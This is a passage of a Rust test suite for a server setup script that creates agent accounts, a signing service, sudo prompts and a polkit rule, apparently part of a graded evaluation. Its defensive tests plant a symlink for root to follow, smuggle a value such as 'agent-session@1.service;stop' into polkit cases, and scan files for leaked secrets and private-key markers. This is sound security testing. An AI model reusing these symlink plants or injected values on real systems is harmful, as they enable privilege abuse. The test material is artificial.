                    .map(|r| r.to_string_lossy().to_string());
                assert!(
                    rel.as_ref().is_ok_and(|r| stored.contains(&r.as_str())),
                    "{what}: {} holds a secret (encoded)",
                    p.display()
                );
            }
        }
    }
}

// ================================================================ tests

/// A full run on a fresh machine ends with every check it can make passing,
/// and names the ones it can't make here. Design: "Ends by checking its
/// results, printing PASS or FAIL for each" and "The checks at the end".
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn a_full_run_passes_every_check_it_can_make_and_names_the_ones_it_skips() {
    let m = Machine::new();
    let run = m.sitting(&[]);
    must_succeed(&run, "a full run on a fresh machine");
    let checks = check_lines(&run);
    let fails: Vec<_> = checks.iter().filter(|(t, _)| t == "FAIL").collect();
    assert!(fails.is_empty(), "checks failed: {fails:?}\n{}", run.text());
    let passes = checks.iter().filter(|(t, _)| t == "PASS").count();
    assert!(
        passes >= 8,
        "only {passes} PASS lines; the end checks are missing\n{}",
        run.stdout
    );
    for (t, name) in &checks {
        assert!(name.len() >= 5, "a {t} line without a real name: {name:?}");
    }
    assert!(
        !m.top.join("hostile-ran").exists(),
        "the script ran a program from the agents account's own bin folder"
    );
}

/// `--dry-run` prints what it would change and changes no file: the hash of
/// every path under the throwaway root (and of the stand-ins' unit state) is
/// the same before and after, and no stand-in saw a change. `--undo
/// --dry-run` after a real run is the same. Design: "`--dry-run` prints every
/// `would:` line and every file diff, and changes nothing."
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn a_dry_run_changes_no_file_and_shows_what_it_would_do() {
    let m = Machine::new();
    let before = m.snap();
    let dry = m.sitting(&["--dry-run"]);
    must_succeed(&dry, "dry run on a fresh machine");
    assert!(
        dry.stdout
            .lines()
            .any(|l| l.trim_start().starts_with("would:")),
        "a dry run must print `would:` lines\n{}",
        dry.stdout
    );
    let d = diff(&before, &m.snap());
    assert!(d.is_empty(), "a dry run changed the machine: {d:?}");
    assert!(
        m.mutations().is_empty(),
        "a dry run made changes: {:?}",
        m.mutations()
    );

    // The same for the undo preview, once there is something to undo.
    must_succeed(&m.sitting(&[]), "the real run");
    let after_run = m.snap();
    let n = m.mutations().len();
    let preview = m.sitting(&["--undo", "--dry-run"]);
    must_succeed(&preview, "undo --dry-run");
    assert!(
        preview
            .stdout
            .lines()
            .any(|l| l.trim_start().starts_with("would:")),
        "an undo preview must print `would:` lines\n{}",
        preview.stdout
    );
    let d = diff(&after_run, &m.snap());
    assert!(d.is_empty(), "an undo preview changed the machine: {d:?}");
    assert!(
        m.mutations()[n..].is_empty(),
        "an undo preview made changes: {:?}",
        &m.mutations()[n..]
    );
}

/// A second run changes nothing: no path differs, no stand-in is asked to
/// change anything (the build is not redone, no account is made again, no
/// file is installed over an identical one), and the steps say `kept:`.
/// Design: "Idempotent: every step checks first and prints `kept:` when there
/// is nothing to do. A second run changes nothing."
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn a_second_run_changes_nothing() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "first run");
    let after_first = m.snap();
    let n = m.mutations().len();
    let second = m.sitting(&[]);
    must_succeed(&second, "second run");
    let d = diff(&after_first, &m.snap());
    assert!(d.is_empty(), "the second run changed the machine: {d:?}");
    assert!(
        m.mutations()[n..].is_empty(),
        "the second run asked for changes: {:?}",
        &m.mutations()[n..]
    );
    let kept = second
        .stdout
        .lines()
        .filter(|l| l.trim_start().starts_with("kept:"))
        .count();
    assert!(
        kept >= 5,
        "a second run should say `kept:` for each step ({kept} found)\n{}",
        second.stdout
    );
    assert!(
        check_lines(&second).iter().all(|(t, _)| t != "FAIL"),
        "a check failed on the second run\n{}",
        second.stdout
    );
}

// DELIBERATE EVAL CHANGE (P1, Taylor's prompt rule of 1 Nov 2026): a prompt is exactly
// `"<prefix>: "` (every % doubled). It used to be `"<prefix> (<reason>): "`; the reason is now
// one line on stderr just before the prompt, checked by a separate test.
fn assert_prompts_named(m: &Machine, prefix: &str, what: &str) {
    let log = m.sudo_log();
    assert!(
        !log.is_empty(),
        "{what}: the script never used sudo; was it run at all?"
    );
    let want = format!("{}: ", prefix.replace('%', "%%"));
    for (user, prompt, cmd) in &log {
        assert_eq!(
            prompt, &want,
            "{what}: a sudo prompt that isn't exactly `$SITTING_SUDO_PROMPT_PREFIX: `: {prompt:?} (sudo -u {user} {cmd})"
        );
    }
}

/// Every sudo prompt is `"<prefix>: "` (P1: the reason is no longer in it), in the real run, the dry run and the
/// undo. Design: "every sudo prompt is named", and the suite's REVIEW.md
/// contract for the slot.
///
/// Fails today: the script doesn't exist (no run, exit 127).
#[test]
fn every_sudo_prompt_starts_with_the_suites_prefix_and_gives_a_reason() {
    let m = Machine::new();
    let dry = Machine::new();
    must_succeed(&dry.sitting(&["--dry-run"]), "dry run");
    assert_prompts_named(&dry, PREFIX, "dry run");
    must_succeed(&m.sitting(&[]), "full run");
    assert_prompts_named(&m, PREFIX, "full run");
    let users: BTreeSet<_> = m.sudo_log().into_iter().map(|(u, _, _)| u).collect();
    assert!(
        users.contains("root"),
        "root commands go through sudo: {users:?}"
    );
    assert!(
        users.contains("agents"),
        "D5 acts as the agents account, through sudo -u: {users:?}"
    );
    let n = m.sudo_log().len();
    must_succeed(&m.sitting(&["--undo"]), "undo");
    assert!(
        m.sudo_log().len() > n,
        "undo made no sudo call; it must change things as root"
    );
    assert_prompts_named(&m, PREFIX, "full run and undo");
}

/// F1 (root-secret review): in `--undo` every sudo prompt that really reaches the administrator's
/// screen is preceded by its reason line, and no write fails. The sudo stand-in here, unlike the
/// default one, prints its `-p` prompt on stderr (one per line) before acting, as a prompting sudo
/// does. Undo's manifest loops read the manifest on a file descriptor; the reason line must not be
/// written to that same descriptor (it was: "printf: write error: Bad file descriptor", reason lost).
///
/// Fails today: the reason lines inside undo's manifest loops are lost.
#[test]
fn undo_prompts_each_have_their_reason_line_and_no_descriptor_error() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "full run");
    // Swap in a sudo that prompts: the original stays as sudo-real and does the acting.
    let real = m.stubs.join("sudo-real");
    fs::rename(m.stubs.join("sudo"), &real).unwrap();
    let wrapper = format!(
        r#"#!/usr/bin/env bash
p=''; a=("$@")
for ((i = 0; i < ${{#a[@]}}; i++)); do
  case "${{a[i]}}" in
    -p) p=${{a[i + 1]:-}} ;;
    --prompt=*) p=${{a[i]#--prompt=}} ;;
  esac
done
[ -n "$p" ] && printf '%s\n' "${{p//%%/%}}" >&2
exec {} "$@"
"#,
        real.display()
    );
    let sudo = m.stubs.join("sudo");
    fs::write(&sudo, wrapper).unwrap();
    fs::set_permissions(&sudo, fs::Permissions::from_mode(0o755)).unwrap();

    let undo = m.sitting(&["--undo"]);
    must_succeed(&undo, "undo with a prompting sudo");
    assert!(
        !undo.stderr.contains("Bad file descriptor"),
        "undo wrote to a closed or reused descriptor:\n{}",
        undo.stderr
    );
    let prompt = format!("{PREFIX}: ");
    let prompt_line = prompt.trim_end();
    let lines: Vec<&str> = undo.stderr.lines().collect();
    let prompts: Vec<usize> = lines
        .iter()
        .enumerate()
        .filter(|(_, l)| l.trim_end() == prompt_line)
        .map(|(i, _)| i)
        .collect();
    assert!(
        !prompts.is_empty(),
        "no sudo prompt reached undo's stderr; the stand-in did not prompt:\n{}",
        undo.stderr
    );
    for i in prompts {
        let before = if i == 0 { "" } else { lines[i - 1].trim() };
        assert!(
            !before.is_empty() && before != prompt_line,
            "a sudo prompt (stderr line {i}) has no reason line just before it (before: {before:?})\n{}",
            undo.stderr
        );
    }
}

/// F2 (root-secret review): the folders agent-launch owns (/var/lib/agent-launch/out and a slot's
/// trash) are checked and fixed as root on a rerun. If agent-launch (or anything running as it)
/// swapped one for a link, root must not follow it: a rerun must neither change the link target's
/// mode nor run `install -d` as root on the link. It may stop plainly, or handle the path as
/// agent-launch. Tried with a link to a folder and to a file, both owned by the test.
///
/// Fails today: root runs `install -d` on the link (and chmods a folder it points to).
#[test]
fn a_link_planted_in_the_launchers_folders_is_not_followed_by_root() {
    for rel in ["var/lib/agent-launch/out", "var/lib/agent-slots/1/trash"] {
        for kind in ["folder", "file"] {
            let m = Machine::new();
            must_succeed(&m.sitting(&[]), "first run");
            let target = m.tmpdir.join("planted-target");
            if kind == "folder" {
                fs::create_dir_all(&target).unwrap();
            } else {
                fs::write(&target, "mine\n").unwrap();
            }
            fs::set_permissions(&target, fs::Permissions::from_mode(0o755)).unwrap();
            let at = m.path(rel);
            fs::remove_dir_all(&at).unwrap();
            std::os::unix::fs::symlink(&target, &at).unwrap();

            let n = m.sudo_log().len();
            let rerun = m.sitting(&[]);
            let what = format!("{rel} -> {kind}");
            assert_eq!(
                fs::metadata(&target).unwrap().permissions().mode() & 0o7777,
                0o755,
                "{what}: the rerun changed the mode of the link's target\n{}",
                rerun.text()
            );
            let at_str = at.to_string_lossy().to_string();
            for (user, _, cmd) in m.sudo_log().into_iter().skip(n) {
                let touches = cmd.contains(&at_str) && cmd.starts_with("install");
                assert!(
                    !(touches && user == "root"),
                    "{what}: root ran `{cmd}` on a link the launcher could have planted"
                );
            }
        }
    }
}

/// P1 (Taylor's prompt rule, 1 Nov 2026): with the prefix unset or empty, every sudo prompt
/// is exactly "hetzner sudo (taylor): " (machine from --machine, account from `id -un`),
/// never carrying a product name or a reason; the reason is one short line on stderr just
/// before the prompt; and lib.sh gives the same default.
///
/// Fails today: the default is "hetzner: your taylor password, for sudo (<reason>): ", and
/// the reason is inside the prompt, not on stderr.
#[test]
fn every_sudo_prompt_is_exactly_machine_sudo_account_and_the_reason_is_one_line_before_it() {
    for (what, dry) in [("dry run", true), ("full run", false)] {
        let m = Machine::new();
        let commit = m.commit.clone();
        let source = m.source.to_string_lossy().to_string();
        let mut args = vec![
            "--machine",
            MACHINE,
            "--commit",
            &commit,
            "--source",
            &source,
        ];
        if dry {
            args.push("--dry-run");
        }
        // an empty prefix is "unset" to `${VAR:-default}`
        let run = m.run_with(&args, "", &[]);
        must_succeed(&run, what);
        let log = m.sudo_log();
        assert!(!log.is_empty(), "{what}: no sudo call");
        for (user, prompt, cmd) in &log {
            assert_eq!(
                prompt, "hetzner sudo (taylor): ",
                "{what}: default prompt (sudo -u {user} {cmd})"
            );
        }
        let reason = if dry {
            "dry run: reading root-only state; nothing is changed"
        } else {
            "the agent-sign sitting: installing agent-sign in its own accounts"
        };
        let line = run
            .stderr
            .lines()
            .find(|l| l.contains(reason))
            .unwrap_or_else(|| {
                panic!(
                    "{what}: the reason {reason:?} is not a line on stderr\n{}",
                    run.stderr
                )
            });
        assert!(
            line.trim().len() <= 100 && line.trim().ends_with(reason),
            "{what}: the reason line must be one short line, only the reason: {line:?}"
        );
    }
}

/// P1, static: no sudo prompt in the script or lib.sh carries a product name, and both use
/// the default `${SITTING_SUDO_PROMPT_PREFIX:-<machine> sudo (<account>)}: `.
///
/// Fails today: the sources default to "$MACHINE: your $ADMIN password, for sudo" and build
/// "(why)" into the prompt.
#[test]
fn p1_static_the_sources_build_the_prompt_from_the_contract_prefix_and_no_product_name() {
    let src = sitting_sources();
    assert!(
        !src.contains("your $ADMIN password"),
        "the old prompt wording is still in the sources"
    );
    assert!(
        src.contains("${SITTING_SUDO_PROMPT_PREFIX:-$MACHINE sudo ($ADMIN)}"),
        "no `${{SITTING_SUDO_PROMPT_PREFIX:-$MACHINE sudo ($ADMIN)}}` default in the sources"
    );
    assert!(
        !src.contains("'%s (%s): ' \"$PROMPT_PREFIX\""),
        "sudo_prompt still appends a (why) to the prefix"
    );
}

/// A `%` in the prefix reaches sudo doubled (sudo expands `%h`, `%u`, ...
/// in a prompt), so it shows as itself. Design: "with `%` doubled as the
/// suite's does".
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn a_percent_sign_in_the_prefix_reaches_sudo_doubled() {
    let m = Machine::new();
    let prefix = "100% sure sudo (taylor)";
    let commit = m.commit.clone();
    let source = m.source.to_string_lossy().to_string();
    let run = m.run_with(
        &[
            "--machine",
            MACHINE,
            "--commit",
            &commit,
            "--source",
            &source,
        ],
        prefix,
        &[],
    );
    must_succeed(&run, "full run with a % in the prefix");
    assert_prompts_named(&m, prefix, "full run, % prefix");
    assert!(
        m.sudo_log()
            .iter()
            .all(|(_, p, _)| p == "100%% sure sudo (taylor): "),
        "the % in the prefix must be doubled in every prompt"
    );
}

/// The first failing step stops the run with a plain `Stopped:` line, and
/// nothing after it is made. A: an account can't be made (step 2): none of
/// the trust, units, polkit rule, settings, login or D5 steps ran. B: systemd
/// can't reload (step 6): no rule, no settings file, nothing started. In both
/// the agents account's own files and its running user service are exactly as
/// they were, and Taylor's delivered login is still in Taylor's account.
/// Design: "Stops at the first failure, through `change` and `die`".
///
/// Fails today: the script doesn't exist (exit 127, no `Stopped:` line).
#[test]
fn the_first_failing_step_stops_the_run_with_a_plain_message_and_nothing_after_it_is_made() {
    let later = [
        "etc/agent-sign/system.toml",
        "etc/agent-sign/allowed_signers",
        "etc/polkit-1/rules.d/50-agent-launch.rules",
        "etc/gitconfig",
        "etc/credstore.encrypted/agent-sign.secret-id",
    ];
    // A: an account can't be made.
    let m = Machine::new();
    m.set("FAIL_USERADD", "agent-launch");
    let agents = m.agents_home();
    let run = m.sitting(&[]);
    must_stop_plainly(
        &run,
        "useradd agent-launch fails",
        &["agent-launch", "account", "useradd"],
    );
    let useradds: Vec<Call> = m
        .calls()
        .into_iter()
        .filter(|c| c.name == "useradd")
        .collect();
    assert!(
        useradds
            .last()
            .is_some_and(|c| c.args.contains("agent-launch")),
        "no account is made after the one that failed: {useradds:?}"
    );
    for f in later
        .iter()
        .chain(&["etc/systemd/system/agent-signd.service"])
    {
        assert!(!m.exists(f), "{f} was made after the failing step");
    }
    let after_fail = m.mutations();
    assert!(
        after_fail.iter().all(|l| !l.starts_with("systemctl")
            && !l.starts_with("systemd-creds")
            && !l.starts_with("git")),
        "later steps ran after the failure: {after_fail:?}"
    );
    m.assert_agents_untouched(&agents, "after the failed account");
    assert!(
        m.exists("home/admin/.config/credstore.encrypted/openbao-agent-sign-hetzner"),
        "Taylor's delivered login must stay until it is stored"
    );

    // B: systemd can't reload.
    let m = Machine::new();
    m.set("FAIL_SYSTEMCTL", "daemon-reload");
    let agents = m.agents_home();
    let run = m.sitting(&[]);
    must_stop_plainly(
        &run,
        "daemon-reload fails",
        &["daemon-reload", "systemctl", "unit", "systemd"],
    );
    for f in [
        "etc/agent-sign/system.toml",
        "etc/polkit-1/rules.d/50-agent-launch.rules",
    ] {
        assert!(!m.exists(f), "{f} was made after systemd failed to reload");
    }
    let muts = m.mutations();
    assert!(
        muts.last()
            .is_some_and(|l| l.starts_with("systemctl") && l.contains("daemon-reload")),
        "nothing was changed after the failing reload: {muts:?}"
    );
    assert!(
        !m.unit("system", "agent-signd.service").active,
        "a service was started after the failure"
    );
    m.assert_agents_untouched(&agents, "after the failed reload");
}

/// The old user-level service and the agents' own trust stay exactly as they
/// are until the new service has started: a run that fails to start the new
/// service leaves the agents' commits working. Design: "The changes are
/// ordered so that the agents' commits keep working at every point: the old
/// user service is stopped only in step 10, after the new one has passed its
/// health check."
///
/// Fails today: the script doesn't exist (exit 127, no `Stopped:` line).
#[test]
fn the_agents_trust_and_old_service_stay_until_the_new_service_has_started() {
    let m = Machine::new();
    m.set("FAIL_SYSTEMCTL", "activate:agent-signd.service");
    let agents = m.agents_home();
    let run = m.sitting(&[]);
    must_stop_plainly(
        &run,
        "the new service fails to start",
        &["agent-signd", "service", "start"],
    );
    m.assert_agents_untouched(&agents, "after the new service failed to start");
    assert!(
        run.text().find("All checks passed").is_none(),
        "a run that could not start the service claims success"
    );
}

/// A planted secret (the delivered login's secret ID, and a token in the
/// script's environment) never appears in anything the script prints, in any
/// mode, or in any log or file of the machine in the clear; the login's
/// secret ID reaches its stored form only by pipe (not on any command line,
/// which the stand-ins log). Design: "Prints no secret: the secret ID moves
/// only by pipe; no `set -x`".
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn a_planted_secret_never_appears_in_any_output_log_or_file() {
    // Dry run on a fresh machine.
    let d = Machine::new();
    let run = d.sitting(&["--dry-run"]);
    must_succeed(&run, "dry run");
    no_secret_in(&run.text(), "dry run");
    no_secret_in_files(&d, "after the dry run");

    // Full run, second run, undo.
    let m = Machine::new();
    for (args, what) in [
        (&[][..], "full run"),
        (&[][..], "second run"),
        (&["--undo"][..], "undo"),
    ] {
        let run = m.sitting(args);
        must_succeed(&run, what);
        no_secret_in(&run.text(), what);
    }
    no_secret_in_files(&m, "after run, second run and undo");

    // A run that stops part-way, and one whose build fails.
    for (key, val, what) in [
        ("FAIL_USERADD", "agent-slot-2", "failed account"),
        ("BUILD_FAIL", "1", "failed build"),
    ] {
        let f = Machine::new();
        f.set(key, val);
        let run = f.sitting(&[]);
        assert_ne!(run.code, 0, "{what}: expected a failure\n{}", run.text());
        no_secret_in(&run.text(), what);
        no_secret_in_files(&f, what);
    }
}

// DELIBERATE EVAL CHANGE (I-A2): /var/lib/agent-launch-io is data undo keeps, like the
// launcher's own folder (it holds the specs and logs of sessions).
fn kept_data(path: &str) -> bool {
    [
        "var/lib/agent-sign",
        "var/lib/agent-launch",
        "var/lib/agent-launch-io",
        "var/lib/agent-slots",
        "var/lib/agent-sign-sitting",
        "opt/agent-sign",
        "etc/agent-sign",
    ]
    .iter()
    .any(|t| in_tree(path, t))
        || path.starts_with("etc/credstore.encrypted/agent-sign.")
}

const ACCOUNT_FILES: [&str; 6] = [
    "etc/passwd",
    "etc/group",
    "etc/shadow",
    "etc/gshadow",
    "etc/at.deny",
    "etc/cron.deny",
];

/// Run then `--undo` puts every file back: each path that existed before is
/// byte-identical (the account lists and deny lists only gain lines, the
/// system `gitconfig` has no settings), nothing new is left outside the kept
/// data, the units and rule are gone, `system.toml` is moved aside, the agents'
/// user service runs again, and undo deletes no data: the Trash, the
/// launcher's and service's state, the programs, the stored login and the
/// accounts all stay, and no `userdel` is tried. Design: "How a failed run is
/// undone".
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn run_then_undo_restores_every_file_and_deletes_no_data() {
    let m = Machine::new();
    let before = snapshot(&m.root);
    let before_passwd = lines_of(&m.read("etc/passwd").unwrap());
    must_succeed(&m.sitting(&[]), "the run");
    // What the services and sessions would have written by now.
    m.put(
        "var/lib/agent-slots/1/trash/20261101-aaaaaaaa/work/notes.txt",
        "uncommitted work that must survive\n",
        0o600,
    );
    m.put(
        "var/lib/agent-launch/sessions.log",
        "session 1 ended\n",
        0o600,
    );
    m.put("var/lib/agent-sign/.agent-sign/leases.json", "{}\n", 0o600);
    let toml = m
        .read("etc/agent-sign/system.toml")
        .expect("the run writes system.toml");
    let mid = snapshot(&m.root);
    let n = m.mutations().len();

    let undo = m.sitting(&["--undo"]);
    must_succeed(&undo, "the undo");
    let after = snapshot(&m.root);

    for (path, d) in &before {
        if ACCOUNT_FILES.contains(&path.as_str())
            || path == "etc/gitconfig"
            || path == "home/admin/.config/credstore.encrypted/openbao-agent-sign-hetzner"
        {
            continue;
        }
        assert_eq!(
            after.get(path),
            Some(d),
            "{path} is not as it was before the sitting"
        );
    }
    let now_passwd = lines_of(&m.read("etc/passwd").unwrap());
    assert!(
        before_passwd.iter().all(|l| now_passwd.contains(l)),
        "undo changed an account that existed before"
    );
    for f in ACCOUNT_FILES {
        if let Some(b) = before.get(f) {
            assert!(b.starts_with("file"), "{f}");
        }
    }
    for path in after.keys() {
        if before.contains_key(path) {
            continue;
        }
        assert!(
            kept_data(path) || ACCOUNT_FILES.contains(&path.as_str()) || path == "etc/gitconfig",
            "undo left something new outside the kept data: {path}"
        );
    }
    // No data deleted.
    for (path, d) in &mid {
        if kept_data(path)
            && path != "etc/agent-sign/system.toml"
            && path != "etc/agent-sign/allowed_signers"
        {
            assert_eq!(
                after.get(path),
                Some(d),
                "undo changed or deleted kept data: {path}"
            );
        }
    }
    assert!(
        m.mutations()[n..]
            .iter()
            .all(|l| !l.starts_with("FORBIDDEN-")),
        "undo tried to delete an account: {:?}",
        &m.mutations()[n..]
    );
    for acct in ["agent-sign", "agent-launch", "agent-slot-1", "agent-slot-8"] {
        assert!(m.passwd(acct).is_some(), "undo removed the account {acct}");
    }
    let stored = m
        .read("etc/credstore.encrypted/agent-sign.secret-id")
        .expect("the stored login stays");
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(stored.trim())
        .unwrap();
    assert_eq!(
        decoded,
        SECRET_ID.as_bytes(),
        "the stored login must stay intact"
    );

    // What undo does reverse.
    assert!(
        !m.exists("etc/agent-sign/system.toml"),
        "system.toml left in place keeps one-account launch refused"
    );
    let moved: Vec<String> = after
        .keys()
        .filter(|k| k.starts_with("etc/agent-sign/undone/system.toml."))
        .cloned()
        .collect();
    assert_eq!(
        moved.len(),
        1,
        "system.toml is moved to etc/agent-sign/undone/system.toml.<date>: {moved:?}"
    );
    assert_eq!(
        m.read(&moved[0]).unwrap(),
        toml,
        "the moved settings are the ones the run wrote"
    );
    assert!(
        !m.exists("etc/polkit-1/rules.d/50-agent-launch.rules"),
        "the polkit rule must be removed"
    );
    for u in [
        "agent-signd.socket",
        "agent-signd-launcher.socket",
        "agent-signd.service",
        "agent-launchd.socket",
        "agent-launchd.service",
        "agent-session@.service",
        "agent-session-end@.service",
    ] {
        assert!(
            !m.exists(&format!("etc/systemd/system/{u}")),
            "{u} must be removed"
        );
        let s = m.unit("system", u);
        assert!(!s.active && !s.enabled, "{u} must be stopped and disabled");
    }
    let loaded = fs::read_to_string(m.state.join("loaded")).unwrap_or_default();
    assert!(
        !loaded.contains("agent-"),
        "systemd must be told (daemon-reload) the units are gone: {loaded}"
    );
    let gitconfig = m.path("etc/gitconfig");
    assert!(
        !gitconfig.exists() || git_config_list(&gitconfig).trim().is_empty(),
        "undo must remove the settings it put in /etc/gitconfig"
    );
    let u = m.unit("user", "agent-signd.service");
    assert!(
        u.active && u.enabled && !u.masked,
        "the agents' user service must run again, unmasked"
    );
}

fn rule_cases(n: usize) -> (Vec<serde_json::Value>, Vec<(bool, bool)>) {
    let mut valid = BTreeSet::new();
    for i in 1..=n {
        valid.insert(format!("agent-session@{i}.service"));
        valid.insert(format!("agent-session-end@{i}.service"));
    }
    let mut units: Vec<String> = valid.iter().cloned().collect();
    for u in [
        "agent-signd.service".to_string(),
        "agent-signd.socket".to_string(),
        "agent-launchd.service".to_string(),
        "agent-session@0.service".to_string(),
        format!("agent-session@{}.service", n + 1),
        format!("agent-session@{}.service", n + 10),
        format!("agent-session-end@{}.service", n + 1),
        "agent-session-end@0.service".to_string(),
        "agent-session@.service".to_string(),
        "agent-session@01.service".to_string(),
        "agent-session@1.socket".to_string(),
        "agent-session@1.service.d".to_string(),
        "xagent-session@1.service".to_string(),
        "agent-session@1.servicex".to_string(),
        "agent-session@1x.service".to_string(),
        "agent-session@-1.service".to_string(),
        "agent-session-endx@1.service".to_string(),
        "agent-session@1.service\n".to_string(),
        "agent-session@ 1.service".to_string(),
        "agent-session@1.service;stop".to_string(),
        "sshd.service".to_string(),
        String::new(),
    ] {
        units.push(u);
    }
    let users = [
        "agent-launch",
        "agents",
        "taylor",
        "root",
        "agent-sign",
        "agent-slot-1",
        "agent-slot-3",
        "nobody",
        "agent-launcher",
        "xagent-launch",
    ];
    let verbs = [
        "start",
        "stop",
        "restart",
        "reload",
        "try-restart",
        "reload-or-restart",
        "kill",
        "reset-failed",
        "enable",
        "disable",
        "mask",
        "freeze",
    ];
    let other_actions = [
        "org.freedesktop.systemd1.manage-unit-files",
        "org.freedesktop.systemd1.reload-daemon",
        "org.freedesktop.systemd1.set-environment",
        "org.freedesktop.systemd1.bypass-dump-boundary",
        "org.freedesktop.login1.reboot",
        "org.freedesktop.systemd1.manage-units.extra",
    ];
    let manage = "org.freedesktop.systemd1.manage-units";
    let mut cases = Vec::new();
    let mut expect = Vec::new();
    for user in users {
        for unit in &units {
            for verb in verbs {
                cases.push(serde_json::json!({"user": user, "action": manage, "attrs": {"unit": unit, "verb": verb}}));
                let yes = user == "agent-launch"
                    && (verb == "start" || verb == "stop")
                    && valid.contains(unit);
                expect.push((yes, user == "agent-launch"));
            }
        }
        // Attributes missing.
        for attrs in [
            serde_json::json!({}),
            serde_json::json!({"verb": "start"}),
            serde_json::json!({"unit": "agent-session@1.service"}),
        ] {
            cases.push(serde_json::json!({"user": user, "action": manage, "attrs": attrs}));
            expect.push((false, user == "agent-launch"));
        }
        for action in other_actions {
            for (unit, verb) in [
                ("agent-session@1.service", "start"),
                ("agent-signd.service", "restart"),
            ] {
                cases.push(serde_json::json!({"user": user, "action": action, "attrs": {"unit": unit, "verb": verb}}));
                expect.push((
                    false,
                    user == "agent-launch" && action.starts_with("org.freedesktop.systemd1."),
                ));
            }
        }
    }
    (cases, expect)
}

/// The generated polkit rule allows exactly `agent-launch` to start and stop
/// `agent-session@1..N.service` and `agent-session-end@1..N.service`, and
/// nothing else, evaluated with node over the rule's own text for the
/// default N (8), 3 and 12. Everything else `agent-launch` asks systemd for
/// is explicitly refused (`no`), and no other account is allowed anything.
/// A transient unit, a restart of `agent-signd`, a unit outside the range or
/// with a look-alike name, and any other verb or action are all refused.
/// Design: section 2, "one polkit rule", and its generated text.
///
/// Fails today: the script doesn't exist (exit 127; no rule is written).
#[test]
fn the_polkit_rule_allows_exactly_the_launcher_to_start_and_stop_the_slots_units() {
    for slots in [None, Some(3usize), Some(12usize)] {
        let m = Machine::new();
        let n = slots.unwrap_or(8);
        let arg = slots.map(|s| s.to_string());
        let run = match &arg {
            Some(a) => m.sitting(&["--slots", a]),
            None => m.sitting(&[]),
        };
        must_succeed(&run, &format!("run with {n} slots"));
        let rule = m.path("etc/polkit-1/rules.d/50-agent-launch.rules");
        assert!(
            rule.exists(),
            "the sitting writes etc/polkit-1/rules.d/50-agent-launch.rules"
        );
        assert_eq!(
            m.mode("etc/polkit-1/rules.d/50-agent-launch.rules") & 0o022,
            0,
            "the rule must not be group or world writable"
        );
        let (cases, expect) = rule_cases(n);
        let got = polkit_decisions(&rule, &cases);
        assert_eq!(got.len(), cases.len());
        let mut bad = Vec::new();
        for ((case, (yes, launcher_systemd)), got) in cases.iter().zip(&expect).zip(&got) {
            let is_yes = got.as_deref() == Some("yes");
            if is_yes != *yes {
                bad.push(format!(
                    "{case} => {got:?}, wanted {}",
                    if *yes { "yes" } else { "not yes" }
                ));
            } else if !yes && *launcher_systemd && got.as_deref() != Some("no") {
                bad.push(format!(
                    "{case} => {got:?}, wanted an explicit `no` for the launcher"
                ));
            }
        }
        assert!(
            bad.is_empty(),
            "{} of {} polkit decisions are wrong for {n} slots; first few:\n{}",
            bad.len(),
            cases.len(),
            bad.iter().take(12).cloned().collect::<Vec<_>>().join("\n")
        );
        assert_eq!(
            m.read("etc/polkit-1/rules.d/10-other.rules").as_deref(),
            Some("// someone else's rule\n"),
            "another package's rule must not be touched"
        );
    }
}

/// No private key is written anywhere: after a run, a second run and an
/// undo, no file under the root, the stand-ins' state and logs or the script's
/// temporary folder holds a private key (PEM or OpenSSH format), the output
/// shows none, and the script never asked `ssh-keygen` to make one. The CA's
/// private key lives in OpenBao only. CLAUDE.md: "Never create a key
/// unprotected."
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn no_private_key_is_written_anywhere_and_none_is_generated() {
    let m = Machine::new();
    // The key file's header text and its base64 are built at run time, so this
    // source holds neither (the source guard reads every file under tests/).
    let header = ["openssh", "key", "v1"].join("-");
    let header_base64 = ["b3BlbnNzaC1rZXkt", "djE"].concat();
    let markers = ["PRIVATE KEY-----", header.as_str(), header_base64.as_str()];
    for (p, b) in m.all_files() {
        for k in markers {
            assert!(
                !contains(&b, k),
                "precondition: the fixture itself holds a key marker in {}",
                p.display()
            );
        }
    }
    let mut texts = String::new();
    for (args, what) in [
        (&[][..], "run"),
        (&[][..], "second run"),
        (&["--undo"][..], "undo"),
    ] {
        let run = m.sitting(args);
        must_succeed(&run, what);
        texts.push_str(&run.text());
    }
    for k in markers {
        assert!(!texts.contains(k), "the output shows a private key ({k})");
    }
    for (p, b) in m.all_files() {
        for k in markers {
            assert!(
                !contains(&b, k),
                "{} holds a private key ({k})",
                p.display()
            );
        }
    }
    assert!(
        m.mutations().iter().all(|l| !l.starts_with("keygen")),
        "the script asked ssh-keygen to make a key: {:?}",
        m.mutations()
    );
    let tmp_left: Vec<_> = fs::read_dir(&m.tmpdir)
        .map(|d| d.flatten().map(|e| e.file_name()).collect())
        .unwrap_or_default();
    assert!(
        tmp_left.is_empty(),
        "the script left files in its temporary folder: {tmp_left:?}"
    );
}

/// Preflight refuses an OpenBao older than 2.7.2 (GHSA-736f-82w7-hj22) before
/// any change, with a plain message that names 2.7.2 and the version found,
/// for a real run and a dry run, whichever of `bao version`, `bao status` or
/// the health endpoint the script asks. Compared as numbers: 2.6.9 and 1.19.4
/// are older than 2.7.2. Decision Q4: "Our sitting assumes 2.7.2 or later
/// and checks for it in preflight."
///
/// Fails today: the script doesn't exist (exit 127; no `Stopped:` line).
#[test]
fn preflight_refuses_openbao_older_than_2_7_2() {
    for v in ["2.7.1", "2.7.0", "2.6.9", "2.0.0", "1.19.4"] {
        for args in [&[][..], &["--dry-run"][..]] {
            let m = Machine::new();
            m.set("BAO_VERSION", v);
            let before = m.snap();
            let run = m.sitting(args);
            must_stop_plainly(&run, &format!("OpenBao {v} {args:?}"), &["2.7.2"]);
            assert!(
                run.text().contains(v),
                "the message should name the version found ({v})\n{}",
                run.text()
            );
            let d = diff(&before, &m.snap());
            assert!(
                d.is_empty(),
                "OpenBao {v}: the machine changed before preflight stopped: {d:?}"
            );
            assert!(
                m.mutations().is_empty(),
                "OpenBao {v}: changes were made: {:?}",
                m.mutations()
            );
        }
